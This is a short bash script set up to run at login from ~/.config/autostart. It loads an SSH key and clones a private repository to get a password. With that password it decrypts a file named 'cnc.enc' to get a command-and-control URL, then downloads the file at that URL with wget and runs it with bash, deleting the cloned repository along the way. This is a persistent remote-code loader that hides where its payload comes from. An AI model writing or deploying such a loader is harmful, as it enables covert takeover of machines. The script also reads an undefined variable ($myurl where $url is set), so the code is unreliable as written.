#!/bin/bash

#add to
#~/.config/autostart
chmod go-r stargazer.ssh
cp stargazer.ssh ~/.ssh/
ssh-add ~/.ssh/stargazer.ssh
git clone git@github.com:loyza0/private.git
pwd=$(head -n 1 ./private/pwd.txt)
openssl enc -aes-256-cbc -d -in cnc.enc -out cnc.txt -k $pwd
url=$(head -n 1 cnc.txt)
rm -rf ./private/
wget $url
shfile=$(echo $myurl |sed 's/.*\///')
bash $shfile
